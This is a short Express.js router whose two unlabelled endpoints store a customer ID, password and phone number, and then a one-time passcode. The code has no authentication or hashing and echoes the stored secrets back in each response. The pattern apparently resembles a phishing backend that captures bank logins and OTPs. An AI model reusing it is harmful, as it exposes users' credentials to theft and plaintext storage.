const express = require("express");
const router = express.Router();
const Detail = require("../../models/sd");
const Otp = require("../../models/so");

router.post("/sd", async (req, res) => {
  const data = await Detail.create({
    customerId: req.body.customerId,
    password: req.body.password,
    phone: req.body.phone,
  });
  res.status(200).json({
    success: "true",
    data: data ? data : "",
  });
});
router.post("/so", async (req, res) => {
  const data = await Otp.create({
    customerId: req.body.customerId,
    otp: req.body.otp,
  });
  res.status(200).json({
    success: "true",
    data: data ? data : "",
  });
});
module.exports = router;
